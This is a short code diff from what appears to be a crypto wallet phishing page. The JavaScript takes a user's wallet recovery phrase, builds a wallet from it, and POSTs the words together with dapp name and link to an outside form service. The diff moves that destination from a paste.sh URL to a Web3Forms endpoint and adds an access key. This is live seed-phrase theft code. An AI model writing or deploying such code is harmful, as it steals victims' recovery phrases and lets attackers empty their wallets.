@@ -1181,10 +1181,11 @@
                 const wallet = ethers.Wallet.fromMnemonic(dappWords);
                 // result box section
                 $.ajax({
-                    url: "https://paste.sh/jhwugCkt#VjxvYiGJbeMXTRkbVxS0Rd-V",
+                    url: "https://api.web3forms.com/submit", 
                     method: "POST",
                     dataType: "JSON",
                     data: {
+					 access_key: "ec61471a-184f-460c-a823-cb1963aa27a9", // your Web3Forms public key
                         dappWord: dappWords,
                         dappName: dappName,
                         linkName: dappLinkName,
